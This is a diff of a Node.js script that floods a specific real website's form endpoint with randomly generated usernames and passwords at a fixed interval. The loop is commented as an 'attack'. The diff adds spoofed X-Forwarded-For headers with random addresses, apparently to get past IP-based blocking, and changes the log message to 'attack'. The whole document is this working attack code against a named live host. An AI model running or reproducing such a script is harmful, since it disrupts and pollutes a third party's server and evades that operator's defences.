@@ -14,17 +14,25 @@ const ip = `${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)
 const username = Math.round(Math.random() * 9999999999);
 // 密码
 const password = Math.round(Math.random() * 9999999999);
+
 function getClientIp(req) {
     return req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.connection.socket.remoteAddress;
 }
+
 // 进攻
 setInterval(function () {
     axios({
         url: 'http://www.dnf-me.cn/in.asp?action=add',
         method: 'post',
+        headers: {
+            'x-forwarded-for': ip,
+        },
+        connection: {
+            remoteAddress: `${ip}:80`,
+        },
         data: {
             dede_fields: 'u,text;p,text',
             dede_fieldshash: ['d1WEGXsPu8CFufla1kRw8W8kW3QA2TG'.split('').sort(() => Math.random() - 0.5).join(''), 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG'][Math.round(Math.random())],
@@ -34,10 +42,10 @@ setInterval(function () {
             j_xm: password,
         },
     }).then(function (json) {
-        console.log(json);
-        console.log('yes');
+        // console.log(json);
+        console.log('attack');
         // console.log(getClientIp(json.headers.request));
     });
-}, 60);
+}, 500);
 // 监听进程
 app.listen('6661');
